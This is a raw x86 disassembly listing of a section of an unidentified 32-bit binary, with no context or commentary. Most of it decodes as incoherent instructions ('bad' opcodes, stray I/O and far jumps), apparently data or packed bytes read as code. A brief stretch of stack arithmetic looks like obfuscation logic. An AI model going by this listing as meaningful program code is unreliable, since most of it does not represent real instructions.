  41841d:	push   ecx
  41841e:	add    al,ah
  418420:	sub    bh,BYTE PTR [edi]
  418422:	das    
  418423:	mov    si,0xe0e8
  418427:	addr16 jno 0x418446
  41842a:	in     eax,0xb1
  41842c:	jmp    0x4183d7
  41842e:	xchg   ebx,eax
  41842f:	cmp    al,0xfe
  418431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418432:	repz add esi,0xeb6d5d86
  418439:	mov    cs:0x2eb4e568,eax
  41843f:	mov    ds:0x79491e99,eax
  418444:	pmuludq mm4,mm4
  418447:	mov    ?,WORD PTR fs:[edi-0x3c]
  41844b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41844c:	lahf   
  41844d:	jecxz  0x418457
  41844f:	mov    esp,0xb1a1ea18
  418454:	icebp  
  418455:	fcom   DWORD PTR [ebx]
  418457:	cmp    BYTE PTR [edx+0x2b],dh
  41845a:	pop    ds
  41845b:	aaa    
  41845c:	mov    al,0xb9
  41845e:	repz mov eax,0x70b08ece
  418464:	add    ebp,DWORD PTR [esi+0x22]
  418467:	int    0xfd
  418469:	mov    esi,ebx
  41846b:	scas   eax,DWORD PTR es:[edi]
  41846c:	mov    ds:0xad1eff31,al
  418471:	xchg   edi,eax
  418472:	fsubr  st(0),st
  418474:	stc    
  418475:	fs aaa 
  418477:	ficom  WORD PTR [edx-0x1520a834]
  41847d:	pop    eax
  41847e:	sub    eax,esi
  418480:	inc    ebp
  418481:	mov    bl,0x7d
  418483:	push   edx
  418484:	adc    edi,DWORD PTR [edi-0x8]
  418487:	or     BYTE PTR [esi+0x23148bb2],0x1b
  41848e:	sbb    BYTE PTR [ebx-0x30],0x7e
  418492:	cmp    al,0xff
  418494:	retf   
  418495:	stos   DWORD PTR es:[edi],eax
  418496:	mov    al,0x44
  418498:	or     BYTE PTR [esi+0x56],ah
  41849b:	mov    eax,0x725fbe3
  4184a0:	xor    al,cl
  4184a2:	ins    BYTE PTR es:[edi],dx
  4184a3:	mov    bh,0xb
  4184a5:	icebp  
  4184a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a7:	sbb    ch,BYTE PTR [eax]
  4184a9:	jle    0x418517
  4184ab:	add    al,0x4c
  4184ad:	dec    ebp
  4184ae:	xor    DWORD PTR [ebp-0x37485537],0x4d40b5f2
  4184b8:	outs   dx,DWORD PTR ds:[esi]
  4184b9:	enter  0xd80e,0xc0
  4184bd:	dec    ebx
  4184be:	ffreep st(3)
  4184c0:	fldenv [ebp+0x7712a099]
  4184c6:	mov    ds:0x4de45011,al
  4184cb:	mov    ebp,0xeb5afd92
  4184d0:	rcl    DWORD PTR [ebp+0x43],cl
  4184d3:	repz (bad) 
  4184d6:	aam    0xc7
  4184d8:	cmp    ecx,DWORD PTR [ecx-0x53]
  4184db:	mov    ds:0x8978d2b4,al
  4184e0:	cmp    al,0xd2
  4184e2:	pop    ecx
  4184e3:	pop    esp
  4184e4:	pop    eax
  4184e5:	mov    ebp,0xe9edc9cc
  4184ea:	mov    al,0x4a
  4184ec:	sub    ah,BYTE PTR [esi+0x32a78024]
  4184f2:	aad    0x15
  4184f4:	push   0x6d
  4184f6:	mov    ecx,0xeacf39b4
  4184fb:	mov    dh,0x11
  4184fd:	pusha  
  4184fe:	lahf   
  4184ff:	and    al,0x8d
  418501:	and    BYTE PTR [ebx-0x2564fe92],cl
  418507:	dec    ebx
  418508:	outs   dx,BYTE PTR ds:[esi]
  418509:	lea    edx,[ebx+0x11]
  41850c:	pop    eax
  41850d:	xchg   BYTE PTR [eax+0x6c],dh
  418510:	aad    0x7c
  418512:	in     eax,0xfe
  418514:	pop    edx
  418515:	jmp    0x418576
  418517:	push   ebp
  418518:	adc    esp,ebp
  41851a:	mov    DWORD PTR [ebx+0x71915117],ecx
  418520:	hlt    
  418521:	push   ecx
  418522:	inc    edx
  418523:	inc    BYTE PTR [ecx+0x411f063c]
  418529:	jecxz  0x41857b
  41852b:	iret   
  41852c:	push   ecx
  41852d:	mov    DWORD PTR [ebp+0x39],eax
  418530:	jge    0x418566
  418532:	inc    edi
  418533:	mov    eax,ds:0xd026bb04
  418538:	or     edi,0x59
  41853b:	and    DWORD PTR [esi+0x2a],esp
  41853e:	pop    ecx
  41853f:	and    DWORD PTR [ecx],ecx
  418541:	test   BYTE PTR [ecx],0x8a
  418544:	rcl    eax,0x9e
  418547:	push   esi
  418548:	mov    eax,0x3ef28ec8
  41854d:	hlt    
  41854e:	mov    ebp,0xf419a3ac
  418553:	aas    
  418554:	mov    edx,0x2cba5704
  418559:	sub    BYTE PTR ds:0xabe480b1,ch
  41855f:	xor    ch,BYTE PTR [ebx]
  418561:	in     al,0x9
  418563:	sbb    BYTE PTR [esi-0x53],cl
  418566:	pop    eax
  418567:	mov    ah,0xf1
  418569:	cmp    ah,BYTE PTR [ebx+0x22]
  41856c:	in     eax,0xcb
  41856e:	loopne 0x41852b
  418570:	out    0x13,al
  418572:	fcomp  QWORD PTR [esi+0x6598bff2]
  418578:	push   esi
  418579:	ror    BYTE PTR [ebp-0x62],cl
  41857c:	mov    bh,ah
  41857e:	fsub   QWORD PTR [edx]
  418580:	sbb    DWORD PTR ds:0x4319c092,esp
  418586:	mov    ebx,gs
  418588:	stos   DWORD PTR es:[edi],eax
  418589:	cmp    eax,DWORD PTR ds:0x3b2d5845
  41858f:	xchg   ebp,eax
  418590:	push   ebp
  418591:	mov    BYTE PTR [ecx-0x3e],0x4
  418595:	icebp  
  418596:	adc    ah,BYTE PTR [edi-0x50]
  418599:	mov    ?,WORD PTR [ebx-0x16]
  41859c:	adc    eax,0xa6475a
  4185a1:	ss aad 0x7e
  4185a4:	add    DWORD PTR [ebp+0x2639e3ad],eax
  4185aa:	xchg   ecx,eax
  4185ab:	inc    esp
  4185ac:	sub    DWORD PTR [ebx],0x386fe205
  4185b2:	or     BYTE PTR [esp+esi*1+0x67],al
  4185b6:	mov    cl,0xcb
  4185b8:	jg     0x41861b
  4185ba:	fsubr  DWORD PTR [esi+0x11]
  4185bd:	ins    DWORD PTR es:[edi],dx
  4185be:	loope  0x418631
  4185c0:	or     al,0xaf
  4185c2:	enter  0x1e49,0x4e
  4185c6:	push   edi
  4185c7:	frstor [ebp+esi*1+0x4ebcaf1f]
  4185ce:	pop    esi
  4185cf:	xchg   esp,eax
  4185d0:	(bad)  
  4185d1:	or     al,BYTE PTR [eax+0x71]
  4185d4:	mov    bh,0x86
  4185d6:	les    ebx,FWORD PTR [edx+0x70cf6a6e]
  4185dc:	xchg   esp,eax
  4185dd:	and    dh,BYTE PTR [ebp+0x52]
  4185e0:	mov    ch,0x5c
  4185e2:	cmp    DWORD PTR [ebx+0x44],edi
  4185e5:	fs loop 0x4185f2
  4185e8:	pop    ebx
  4185e9:	or     eax,DWORD PTR [edi+0x57fba20c]
  4185ef:	add    DWORD PTR [esi+0x7b1d8c73],esi
  4185f5:	xchg   ebx,eax
  4185f6:	ins    DWORD PTR es:[edi],dx
  4185f7:	xor    al,0x7b
  4185f9:	(bad)  
  4185fa:	out    0x9b,eax
  4185fc:	lahf   
  4185fd:	and    eax,0xfa5e1855
  418602:	cmp    ebx,DWORD PTR [ebp+0x3f]
  418605:	lds    eax,FWORD PTR [ecx]
  418607:	xor    esp,esi
  418609:	mov    edx,0x9e726e12
  41860e:	push   ss
  41860f:	sub    cl,BYTE PTR [ecx+edx*1]
  418612:	jp     0x418624
  418614:	es dec ecx
  418616:	cmp    ecx,0xf227caba
  41861c:	add    al,0xb4
  41861e:	cmp    DWORD PTR [ebp-0x5c0eb96d],ebp
  418624:	(bad)  
  418625:	jno    0x41868e
  418627:	lahf   
  418628:	pop    edx
  418629:	push   edi
  41862a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862b:	add    al,0x12
  41862d:	push   ecx
  41862e:	nop
  41862f:	add    al,0x42
  418631:	mov    al,0xff
  418633:	sar    BYTE PTR [ecx+edi*4+0x1a],0x6e
  418638:	adc    edx,ebx
  41863a:	jl     0x418662
  41863c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41863d:	xchg   esi,eax
  41863e:	lea    eax,[eax-0x1ab65b33]
  418644:	sub    ecx,eax
  418646:	retf   
  418647:	arpl   si,ax
  418649:	mov    al,ds:0x943c6daf
  41864e:	inc    esi
  41864f:	hlt    
  418650:	popf   
  418651:	cmc    
  418652:	jnp    0x418678
  418654:	(bad)  
  418655:	adc    esi,DWORD PTR gs:[esi]
  418658:	out    0x9b,al
  41865a:	or     edi,DWORD PTR [bp+si-0x57]
  41865e:	jge    0x41869b
  418660:	jno    0x41866b
  418662:	inc    edx
  418663:	cmp    BYTE PTR [edx+0x72f696ef],bl
  418669:	bound  edi,QWORD PTR ds:0x119cd143
  41866f:	add    al,0x81
  418671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418672:	in     al,0xfa
  418674:	test   al,0xb2
  418676:	lods   al,BYTE PTR ds:[esi]
  418677:	loope  0x41863d
  418679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41867a:	add    BYTE PTR [edi-0x6efb740b],bl
  418680:	inc    edx
  418681:	mov    esi,0xabbb6520
  418686:	jne    0x41861e
  418688:	push   cs
  418689:	test   BYTE PTR [esi],cl
  41868b:	dec    ecx
  41868c:	jae    0x41862a
  41868e:	fcmovne st,st(0)
  418690:	mov    ebp,0xcf86507e
  418695:	arpl   WORD PTR [edi-0x64],di
  418698:	xor    edx,eax
  41869a:	mov    DWORD PTR [ebp+0x8],edx
  41869d:	mov    edx,DWORD PTR [ebp+0x8]
  4186a0:	mov    ebx,DWORD PTR [ebp-0x58]
  4186a3:	add    edx,0x5708c0
  4186a9:	imul   edx,ebx
  4186ac:	mov    DWORD PTR [ebp-0x58],edx
  4186af:	mov    edx,DWORD PTR [ebp+0x8]
  4186b2:	mov    ebx,DWORD PTR [ebp-0x54]
  4186b5:	add    edx,0x64f8a2
  4186bb:	or     edx,ebx
  4186bd:	mov    DWORD PTR [ebp-0x54],edx
  4186c0:	mov    edx,DWORD PTR [ebp+0x8]
  4186c3:	mov    ebx,DWORD PTR [ebp-0x50]
  4186c6:	add    edx,ecx
  4186c8:	xor    edx,ebx
  4186ca:	mov    DWORD PTR [ebp-0x50],edx
  4186cd:	mov    edx,DWORD PTR [ebp+0x8]
  4186d0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4186d3:	add    edx,edi
  4186d5:	and    edx,ebx
  4186d7:	mov    DWORD PTR [ebp-0x4c],edx
  4186da:	mov    edx,DWORD PTR [ebp+0x8]
  4186dd:	mov    ebx,DWORD PTR [ebp-0x48]
  4186e0:	lea    edx,[ebx+edx*1+0x241fc1f]
  4186e7:	mov    DWORD PTR [ebp-0x48],edx
  4186ea:	mov    edx,DWORD PTR [ebp+0x8]
  4186ed:	mov    ebx,0xfa5e15e2
  4186f2:	sub    ebx,edx
  4186f4:	add    ebx,DWORD PTR [ebp-0x44]
  4186f7:	jmp    0x41aab2
  4186fc:	or     ch,BYTE PTR [edi+0x35]
  4186ff:	aad    0xf7
  418701:	mov    bh,0x8a
  418703:	(bad)  
  418704:	sahf   
  418705:	fidivr DWORD PTR [ecx+0x1c456efb]
  41870b:	int    0x5
  41870d:	xor    edi,DWORD PTR [ebp+0x72]
  418710:	rcr    BYTE PTR [edi+0x72],1
  418713:	jb     0x418790
  418715:	jno    0x41870c
  418717:	fist   DWORD PTR [edi-0xe22342f]
  41871d:	jmp    0x418789
  41871f:	xor    al,al
  418721:	test   esp,0xf4ee2c70
  418727:	jecxz  0x418768
  418729:	jbe    0x418771
  41872b:	retf   0xcf60
  41872e:	mov    esi,0x6f4f85e4
  418733:	ds pushf 
  418735:	int    0x3
  418737:	mov    esi,0x7d9348d8
  41873c:	sub    BYTE PTR [eax],ah
  41873e:	and    dh,BYTE PTR [esi]
  418740:	fwait
  418741:	aaa    
  418742:	fimul  DWORD PTR [ebx+0x501f1b09]
  418748:	sbb    BYTE PTR [eax],ah
  41874a:	test   al,0xee
  41874c:	xor    eax,0x19778129
  418751:	addr16 mov ebx,0xb2441115
  418757:	fidiv  WORD PTR [esi]
  418759:	mov    esi,DWORD PTR [esi]
  41875b:	mov    DWORD PTR ds:0xa673fd8f,esi
  418761:	ficom  WORD PTR gs:[edx]
  418764:	imul   esp,DWORD PTR [edx+0x345f4772],0x71
  41876b:	push   eax
  41876c:	jle    0x4187c7
  41876e:	mov    ds:0x1f36df28,al
  418773:	pop    ds
  418774:	mov    BYTE PTR [edi],dh
  418776:	popf   
  418777:	nop
  418778:	xchg   ebp,eax
  418779:	mov    ds:0xed482b8a,al
  41877e:	es sub edx,esp
  418781:	jp     0x418734
  418783:	je     0x41878f
  418785:	cs je  0x4187d6
  418788:	enter  0xb7f6,0x77
  41878c:	cmp    ecx,esi
  41878e:	sbb    ecx,ebp
  418790:	adc    eax,0x327be32b
  418795:	cmc    
  418796:	ss inc ebp
  418798:	mov    BYTE PTR [edi+edx*8+0x47],cl
  41879c:	or     al,bh
  41879e:	xor    BYTE PTR [esi+0x2592e854],ah
  4187a4:	stos   BYTE PTR es:[edi],al
  4187a5:	imul   edx,DWORD PTR [ebp+0x6d2ed805],0x7b
  4187ac:	sbb    dl,BYTE PTR [esi+esi*8]
  4187af:	xchg   esp,eax
  4187b0:	shr    DWORD PTR [ecx],1
  4187b2:	pop    ebp
  4187b3:	sub    DWORD PTR [edi+esi*1],ebx
  4187b6:	or     al,0xbe
  4187b8:	aas    
  4187b9:	cmp    BYTE PTR [eax-0x66],al
  4187bc:	adc    BYTE PTR [ebx-0x16],ch
  4187bf:	mov    al,cl
  4187c1:	add    cl,cl
  4187c3:	push   ds
  4187c4:	sub    BYTE PTR [ecx+ecx*2],bh
  4187c7:	test   eax,0x45ac7351
  4187cc:	push   edx
  4187cd:	add    DWORD PTR [ecx],edx
  4187cf:	sbb    cl,BYTE PTR [ebx]
  4187d1:	mov    ds:0x9edc251b,eax
  4187d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d7:	xchg   esi,eax
  4187d8:	ficomp WORD PTR [ebp-0x3b]
  4187db:	xchg   edx,eax
  4187dc:	jno    0x4187f5
  4187de:	(bad)  
  4187e0:	xchg   edx,eax
  4187e1:	ins    DWORD PTR es:[edi],dx
  4187e2:	sti    
  4187e3:	outs   dx,BYTE PTR ds:[esi]
  4187e4:	rcl    BYTE PTR [esi],1
  4187e6:	scas   al,BYTE PTR es:[edi]
  4187e7:	test   BYTE PTR es:[edi],0xfc
  4187eb:	ret    0x37ce
  4187ee:	hlt    
  4187ef:	inc    esi
  4187f0:	mov    BYTE PTR [ebx-0x58],bl
  4187f3:	rcr    BYTE PTR [ecx+0xb4bd15a],1
  4187f9:	scas   al,BYTE PTR es:[edi]
  4187fa:	inc    esp
  4187fb:	xor    eax,ebx
  4187fd:	xor    bl,BYTE PTR [esi]
  4187ff:	dec    esp
  418800:	mov    ebp,0xd07d418b
  418805:	retf   
  418806:	sub    dl,BYTE PTR [esi+0x386e0691]
  41880c:	dec    edx
  41880d:	loope  0x41880a
  41880f:	test   eax,0xdf606820
  418814:	pop    edi
  418815:	push   0xa68ce93
  41881a:	lahf   
  41881b:	retf   
  41881c:	jmp    0x3947:0x8c7124dd
  418823:	mov    es,WORD PTR [esp+ebx*4+0x1f0974f]
  41882a:	int3   
  41882b:	mov    ds:0x38662a68,al
  418830:	mov    edx,0x22e5650b
  418835:	add    cl,BYTE PTR [esi-0x1]
  418838:	retf   0x38a1
  41883b:	(bad)  
  41883c:	cmp    BYTE PTR [esi],bl
  41883e:	or     eax,0x11e64bd5
  418843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418844:	fild   DWORD PTR [ecx+0x2c]
  418847:	fnsave ds:0xc3d4fb90
  41884e:	cmp    DWORD PTR [ebx+0x43d00237],0x48
  418855:	sub    ah,0x2
  418858:	in     eax,0xd8
  41885a:	push   esp
  41885b:	icebp  
  41885c:	dec    ecx
  41885d:	mov    ds:0x225f02c3,eax
  418862:	lahf   
  418863:	stc    
  418864:	add    BYTE PTR [ebx+ebp*1+0x2],al
  418868:	fwait
  418869:	imul   edx,eax,0xffffff89
  41886c:	mov    al,ds:0xfc32ef86
  418871:	mov    ?,WORD PTR [eax+0x6e]
  418874:	mov    dh,BYTE PTR [ecx+0x266c05bc]
  41887a:	jnp    0x4188b6
  41887c:	xchg   edi,eax
  41887d:	xchg   edi,eax
  41887e:	jmp    0x3664:0xc05d5aad
  418885:	mov    edx,0x7e29b796
  41888a:	scas   al,BYTE PTR es:[edi]
  41888b:	cdq    
  41888c:	xchg   edx,eax
  41888d:	or     eax,0x366205f
  418892:	imul   ebp,DWORD PTR [edi+0x51515e70],0x6e
  418899:	ja     0x4188c9
  41889b:	and    BYTE PTR [ebx+edx*1],al
  41889e:	dec    edi
  41889f:	push   ss
  4188a0:	pop    ss
  4188a1:	inc    esp
  4188a2:	sbb    ebp,esp
  4188a4:	jl     0x418848
  4188a6:	mov    dl,0xaa
  4188a8:	inc    ebx
  4188a9:	cmp    ah,bl
  4188ab:	push   ds
  4188ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ad:	pop    ds
  4188ae:	outs   dx,DWORD PTR ds:[esi]
  4188af:	xchg   ebp,eax
  4188b0:	fsubr  QWORD PTR [edi-0x5e]
  4188b3:	cmp    DWORD PTR [ebx-0x56],ebx
  4188b6:	or     BYTE PTR [edx-0x51],ch
  4188b9:	xadd   dl,al
  4188bc:	sar    BYTE PTR ds:[ebp+0x4a4d3bce],1
  4188c3:	push   ebp
  4188c4:	xchg   edx,eax
  4188c5:	inc    edx
  4188c6:	mov    edi,0xd882a8e3
  4188cb:	and    DWORD PTR [edi+0x26e48544],0x30
  4188d2:	jno    0x4188bb
  4188d4:	dec    ecx
  4188d5:	repz jle 0x418953
  4188d8:	cmp    al,0x41
  4188da:	in     eax,dx
  4188db:	push   ds
  4188dc:	mul    ah
  4188de:	cmp    dl,BYTE PTR [ebp-0x5b]
  4188e1:	mov    eax,ds:0x7c7a2cca
  4188e6:	sub    eax,0x8e4834f8
  4188eb:	inc    edx
  4188ec:	cmp    eax,DWORD PTR [edi]
  4188ee:	sbb    al,0xa1
  4188f0:	sub    edi,esp
  4188f2:	test   al,0x9e
  4188f4:	scas   al,BYTE PTR es:[edi]
  4188f5:	clc    
  4188f6:	or     edx,DWORD PTR [edx]
  4188f8:	das    
  4188f9:	fnstcw WORD PTR [eax]
  4188fb:	pop    eax
  4188fc:	std    
  4188fd:	xor    ah,BYTE PTR [ecx-0x49e2e140]
  418903:	fwait
  418904:	sub    edx,edi
  418906:	scas   al,BYTE PTR es:[edi]
  418907:	stos   BYTE PTR es:[edi],al
  418908:	mov    ecx,0x53fb9e7a
  41890d:	mul    eax
  41890f:	push   ss
  418910:	or     DWORD PTR [esi+edx*4-0x6a3d5067],0xa3e807cc
  41891b:	jbe    0x41898b
  41891d:	and    BYTE PTR [esp+ebp*1-0xa],dh
  418921:	xchg   BYTE PTR [eax-0x25045134],ah
  418927:	push   edx
  418928:	push   0x2a
  41892a:	xor    esi,DWORD PTR [ebx+0x7c]
  41892d:	push   edi
  41892e:	ret    0x6acf
  418931:	retf   0xcff2
  418934:	test   eax,0xb7cc6b43
  418939:	or     eax,esi
  41893b:	pop    esi
  41893c:	jne    0x41896a
  41893e:	dec    esp
  41893f:	(bad)  
  418940:	mov    ebx,0xc29262ff
  418945:	test   al,0x70
  418947:	(bad)  
  418948:	test   eax,0xfde385ab
  41894d:	daa    
  41894e:	fidivr WORD PTR [ebx+0x70]
  418951:	and    cl,BYTE PTR [ebx]
  418953:	sahf   
  418954:	cmp    ebx,DWORD PTR [ebx-0x6dddaca8]
  41895a:	sbb    eax,ebp
  41895c:	jg     0x418956
  41895e:	popa   
  41895f:	xchg   DWORD PTR [eax],esi
  418961:	dec    edi
  418962:	fwait
  418963:	daa    
  418964:	pushf  
  418965:	lea    edi,[ebp+0x63]
  418968:	popa   
  418969:	xor    ebx,eax
  41896b:	add    eax,DWORD PTR [ecx]
  41896d:	mov    eax,ecx
  41896f:	leave  
  418970:	stos   DWORD PTR es:[edi],eax
  418971:	neg    ebp
  418973:	xor    al,0x5b
  418975:	in     eax,0xc1
  418977:	push   0xffffffc7
  418979:	ror    DWORD PTR [ebp+0x38860e17],1
  41897f:	adc    BYTE PTR [eax],0xe4
  418982:	nop
  418983:	mov    bh,BYTE PTR [esi-0x64c96be1]
  418989:	(bad)  
  41898a:	loope  0x418973
  41898c:	jbe    0x418923
  41898e:	dec    edx
  41898f:	je     0x4189de
  418991:	sub    DWORD PTR [ebx+0x4b98ce20],ebx
  418997:	pop    es
  418998:	(bad)  
  418999:	fld    st(1)
  41899b:	push   0x2417a741
  4189a0:	add    al,0xf0
  4189a2:	stc    
  4189a3:	fcomp  DWORD PTR [edi+edx*8-0x2d]
  4189a7:	and    al,0xe8
  4189a9:	shl    BYTE PTR [esp+eax*1-0x60],1
  4189ad:	mov    bl,0x84
  4189af:	(bad)  
  4189b0:	cld    
  4189b1:	les    ebx,FWORD PTR [ecx]
  4189b3:	mov    edx,0x65a20028
  4189b8:	mov    edx,0x4147a68a
  4189bd:	sub    DWORD PTR [ebp-0x7bf242ce],edx
  4189c3:	and    eax,DWORD PTR [eax]
  4189c5:	xor    eax,0x338469b7
  4189ca:	ja     0x418983
  4189cc:	fsub   DWORD PTR [ebp-0x3e2c14a1]
  4189d2:	loope  0x418a35
  4189d4:	mov    ebp,0xde2e2f4c
  4189d9:	stc    
  4189da:	fstp   TBYTE PTR [edx]
  4189dc:	inc    DWORD PTR [ebp-0x21]
  4189df:	out    dx,al
  4189e0:	sub    al,0xd1
  4189e2:	xchg   esi,eax
  4189e3:	push   eax
  4189e4:	mov    bl,0x80
  4189e6:	cli    
  4189e7:	lds    eax,FWORD PTR [esi]
  4189e9:	xor    esi,edi
  4189eb:	pop    ds
  4189ec:	into   
  4189ed:	fisubr WORD PTR [esi+0x3dbe05ac]
  4189f3:	sar    DWORD PTR [ecx],cl
  4189f5:	aaa    
  4189f6:	std    
  4189f7:	pop    eax
  4189f8:	popa   
  4189f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fa:	mov    edi,0xa3ad26e1
  4189ff:	aad    0x93
  418a01:	scas   al,BYTE PTR es:[edi]
  418a02:	mov    ebx,0x7b5860d3
  418a07:	sbb    dl,BYTE PTR [eax]
  418a09:	fucomp st(3)
  418a0b:	dec    ebx
  418a0c:	sub    dh,bl
  418a0e:	jecxz  0x418a34
  418a10:	cld    
  418a11:	mov    ds:0xcee5fe67,al
  418a16:	xchg   ebx,eax
  418a17:	cmp    DWORD PTR [ecx],ebp
  418a19:	push   ebp
  418a1a:	push   ebp
  418a1b:	or     cl,BYTE PTR [edx+eiz*1]
  418a1e:	jecxz  0x4189f6
  418a20:	push   edi
  418a21:	call   0x7c4115c2
  418a26:	mov    bh,0x28
  418a28:	sti    
  418a29:	sar    DWORD PTR [eax-0x72f51cca],1
  418a2f:	xchg   ebp,eax
  418a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a31:	dec    ebp
  418a32:	out    0xb4,eax
  418a34:	popf   
  418a35:	mov    edx,0xd15b8721
  418a3a:	mov    edx,esi
  418a3c:	add    bl,BYTE PTR [ebx+0x36]
  418a3f:	sub    cl,BYTE PTR [eax+0x3d]
  418a42:	hlt    
  418a43:	xchg   edx,eax
  418a44:	sbb    eax,0x8215f848
  418a49:	mov    WORD PTR [edx+esi*2],?
  418a4c:	and    ch,BYTE PTR [esi-0x2]
  418a4f:	shl    BYTE PTR [ecx+0xb],cl
  418a52:	push   ebp
  418a53:	mov    ah,0xff
  418a55:	push   es
  418a56:	cmp    al,bh
  418a58:	aaa    
  418a59:	xor    dl,BYTE PTR [ebx-0x3960ccd3]
  418a5f:	jecxz  0x418a7b
  418a61:	pop    ss
  418a62:	inc    edi
  418a63:	data16 loope 0x418a45
  418a66:	or     bl,BYTE PTR ds:0xffbe4a82
  418a6c:	outs   dx,DWORD PTR ds:[esi]
  418a6e:	mov    eax,0x6feb538f
  418a73:	ret    
  418a74:	(bad)  
  418a75:	fistp  DWORD PTR [ebx-0x1f556c45]
  418a7b:	retf   0xa736
  418a7e:	inc    ebx
  418a7f:	int3   
  418a80:	(bad)  
  418a81:	call   0xe754c03d
  418a86:	jle    0x418ad2
  418a88:	cmp    al,0xd7
  418a8a:	jmp    0x418a7d
  418a8c:	bts    DWORD PTR [ebx],edx
  418a8f:	js     0x418a3a
  418a91:	mov    es,WORD PTR [ebx+0x6a]
  418a94:	mov    ecx,DWORD PTR [edi*2-0x79f29455]
  418a9b:	xchg   ebp,eax
  418a9c:	popf   
  418a9d:	dec    edx
  418a9e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418aa0:	pushf  
  418aa1:	jno    0x418b1b
  418aa3:	inc    edx
  418aa4:	daa    
  418aa5:	or     ebp,DWORD PTR [ecx+0x2eb6f8ed]
  418aab:	retf   0xcbda
  418aae:	cmc    
  418aaf:	retf   
  418ab0:	inc    ebx
  418ab1:	js     0x418ac3
  418ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ab4:	pop    ss
  418ab5:	or     al,0xd5
  418ab7:	leave  
  418ab8:	cli    
  418ab9:	lahf   
  418aba:	dec    esi
  418abb:	sbb    edi,DWORD PTR [ebp-0x5]
  418abe:	icebp  
  418abf:	addr16 (bad) 
  418ac1:	jle    0x418af5
  418ac3:	jge    0x418b29
  418ac5:	loop   0x418a6a
  418ac7:	xor    al,0xd3
  418ac9:	mov    cl,0x86
  418acb:	ds push es
  418acd:	call   0x116c:0xbae1a7b2
  418ad4:	mov    edi,0x66e72e6
  418ad9:	repnz inc esp
  418adb:	xchg   BYTE PTR [ecx+esi*8],dl
  418ade:	push   cs
  418adf:	inc    eax
  418ae0:	and    al,0x8d
  418ae2:	mov    dh,0x87
  418ae4:	fidivr DWORD PTR [edi+edx*4-0x68a612d8]
  418aeb:	add    esp,ebx
  418aed:	add    eax,0x87551b7e
  418af2:	lds    ebp,FWORD PTR [edi]
  418af4:	jmp    0xb354:0xe36d40af
  418afb:	stos   BYTE PTR es:[edi],al
  418afc:	arpl   bx,sp
  418afe:	jg     0x418b01
  418b00:	retf   
  418b01:	(bad)  [edi]
  418b03:	sbb    ebx,edx
  418b05:	sub    al,0x83
  418b07:	(bad)  
  418b09:	pop    ds
  418b0a:	rcr    ebx,0x22
  418b0d:	aam    0xfb
  418b0f:	xchg   ebx,eax
  418b10:	inc    edi
  418b11:	out    0xb2,eax
  418b13:	mov    al,ds:0x925c6ec9
  418b18:	stc    
  418b19:	bound  eax,QWORD PTR [ebx-0x2347fcf5]
  418b1f:	inc    ebx
  418b20:	or     DWORD PTR [esp+eax*1],edi
  418b23:	push   eax
  418b24:	es jne 0x418b05
  418b27:	outs   dx,BYTE PTR ds:[esi]
  418b28:	or     DWORD PTR [edi],ebx
  418b2a:	cmp    DWORD PTR [ebp-0x60],0x9f9a2489
  418b31:	mov    esp,0xb905ea37
  418b36:	xchg   ebx,eax
  418b37:	add    ah,BYTE PTR ds:0x6420b27f
  418b3d:	scas   eax,DWORD PTR es:[edi]
  418b3e:	ret    0xfaba
  418b41:	sub    al,0xc1
  418b43:	and    esp,DWORD PTR [edi+0xe]
  418b46:	mov    bh,bh
  418b48:	adc    DWORD PTR ds:0xf0c6516f,ebp
  418b4e:	popa   
  418b4f:	xchg   esi,eax
  418b50:	xchg   ebx,eax
  418b51:	add    DWORD PTR [ebp-0x408579a9],ebp
  418b57:	mov    edx,0x6f0a4ce8
  418b5c:	mov    al,0x4
  418b5e:	stos   BYTE PTR es:[edi],al
  418b5f:	test   eax,0x21d74090
  418b64:	sahf   
  418b65:	pop    ss
  418b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b67:	imul   esi,eax,0xffffffbe
  418b6a:	push   ecx
  418b6b:	mov    al,0xfd
  418b6d:	std    
  418b6e:	hlt    
  418b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b70:	inc    ebp
  418b71:	push   eax
  418b72:	push   es
  418b73:	fwait
  418b74:	inc    ecx
  418b75:	pop    edi
  418b76:	and    al,0xd6
  418b78:	scas   eax,DWORD PTR es:[edi]
  418b79:	sbb    dh,BYTE PTR [esi+0x36]
  418b7c:	(bad)  
  418b7d:	js     0x418aff
  418b7f:	rcl    BYTE PTR [esi],cl
  418b81:	or     DWORD PTR [edx+0x73],ebx
  418b84:	cwde   
  418b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b86:	xor    bl,BYTE PTR ds:0xa4a03fe0
  418b8c:	push   ds
  418b8d:	push   ebx
  418b8e:	hlt    
  418b8f:	or     al,0x1
  418b91:	mov    ebx,DWORD PTR [ebp+eax*1+0x6a]
  418b95:	jbe    0x418b57
  418b97:	fmul   st(2),st
  418b99:	adc    al,0x91
  418b9b:	retf   0x3b1
  418b9e:	test   dh,al
  418ba0:	and    eax,0x9e5c0d00
  418ba5:	iret   
  418ba6:	repnz push edi
  418ba8:	ucomiss xmm0,xmm6
  418bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bac:	jb     0x418b5c
  418bae:	pushf  
  418baf:	xor    ebp,DWORD PTR [eax]
  418bb1:	icebp  
  418bb2:	popa   
  418bb3:	cmp    dh,BYTE PTR [ecx]
  418bb5:	push   ss
  418bb6:	ins    BYTE PTR es:[edi],dx
  418bb7:	rol    DWORD PTR [edx+ebx*1],cl
  418bba:	fcom   QWORD PTR [edi-0x4865eae6]
  418bc0:	inc    eax
  418bc1:	iret   
  418bc2:	push   es
